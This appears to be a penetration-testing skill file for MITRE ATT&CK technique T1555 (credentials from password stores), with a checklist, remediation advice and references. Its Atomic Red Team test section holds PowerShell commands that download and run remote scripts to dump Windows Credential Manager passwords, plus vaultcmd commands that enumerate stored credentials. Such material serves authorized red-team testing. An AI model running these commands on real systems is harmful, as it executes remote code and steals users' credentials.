---
name: "T1555_credentials-from-password-stores"
description: "Adversaries may search for common password storage locations to obtain user credentials."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1555
  - credential-access
  - iaas
  - linux
  - macos
  - windows
technique_id: "T1555"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - IaaS
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1555"
tech_stack:
  - cloud
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1555.001
  - T1555.002
  - T1555.003
  - T1555.004
  - T1555.005
  - T1555.006
prerequisites:
  []
severity_boost:
  T1555.001: "Chain with T1555.001 for deeper attack path"
  T1555.002: "Chain with T1555.002 for deeper attack path"
  T1555.003: "Chain with T1555.003 for deeper attack path"
---

# T1555 Credentials from Password Stores

## High-Level Description

Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** IaaS, Linux, macOS, Windows

## What to Check

- [ ] Identify if Credentials from Password Stores technique is applicable to target environment
- [ ] Check IaaS systems for indicators of Credentials from Password Stores
- [ ] Check Linux systems for indicators of Credentials from Password Stores
- [ ] Check macOS systems for indicators of Credentials from Password Stores
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Extract Windows Credential Manager via VBA

This module will extract the credentials found within the Windows credential manager and dump
them to $env:TEMP\windows-credentials.txt

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
```

**Dependencies:**
- Microsoft Word must be installed

### Atomic Test 2: Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]

This module will extract the credentials from Windows Credential Manager

**Supported Platforms:** windows

```powershell
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
```

### Atomic Test 3: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]

This module will extract the credentials from Windows Credential Manager

**Supported Platforms:** windows

```powershell
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
```

### Atomic Test 4: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]

This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe

**Supported Platforms:** windows

```powershell
vaultcmd /listcreds:"Windows Credentials" /all
```

### Atomic Test 5: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]

This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe

**Supported Platforms:** windows

```powershell
vaultcmd /listcreds:"Web Credentials" /all
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Credentials from Password Stores by examining the target platforms (IaaS, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1555 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1026 Privileged Account Management
Limit the number of accounts and services with permission to query information from password stores to only those required. Ensure that accounts and services with permissions to query password stores only have access to the secrets they require.

### M1051 Update Software
Perform regular software updates to mitigate exploitation risk.

### M1027 Password Policies
The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password.

Organizations may consider weighing the risk of storing credentials in password stores and web browsers. If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations.


## Detection

### Detect Credentials Access from Password Stores


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Credentials from Password Stores technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [F-Secure The Dukes](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf)
- [Atomic Red Team - T1555](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1555)
- [MITRE ATT&CK - T1555](https://attack.mitre.org/techniques/T1555)
